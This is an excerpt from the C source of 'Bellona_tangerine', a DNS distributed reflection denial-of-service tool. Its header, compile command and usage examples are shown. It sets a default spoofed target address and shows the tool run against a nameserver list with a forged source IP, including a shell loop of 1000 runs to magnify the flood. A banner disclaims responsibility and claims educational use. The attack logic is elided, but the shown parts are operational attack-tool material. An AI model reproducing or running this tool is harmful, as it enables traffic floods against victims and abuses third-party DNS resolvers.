 ...
 * 
 * Bellona v3_Tangerine is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * Bellona is distributed in the hope that it will be useful, but
...
/*******************************************************************************
 * Bellona_tangerine.c - DNS distributed reflection DoS                        *
 *                                                                             *
 * DATE:                                                                       *
 * - 11-09-2012                                                                *
 *                                                                             *
 ...
 *                                                                             *
 * COMPILE:                                                                    *
 * - gcc -o bellona Bellona_tangerine.c -Wall -ansi                            *
 *                                                                             *
 * NOTES:                                                                      *
 * - quick'n'dirty c0de                                                        *
...
/* default settings */
#define DEFAULT_SPOOF_ADDR  "127.0.0.1" /* Edit you target here too */
...
{
    printf("-----------------------------------------------------------------------\
    \nBellona_tangerine - by r3boot3raX & cyber003 \
    \n-----------------------------------------------------------------------\n\n");
    printf(" I am not responsible of it use, this is only for education purposes and testing\
...
void usage()
{
  ...
  ./bellona -f nameserver.lst -s 192.168.2.211 -d google.com. -l 10000\n\n\
  or better:\n\n\
  $ for i in `seq 1 1000`; do ./bellona -f nameserver.lst \\\n\
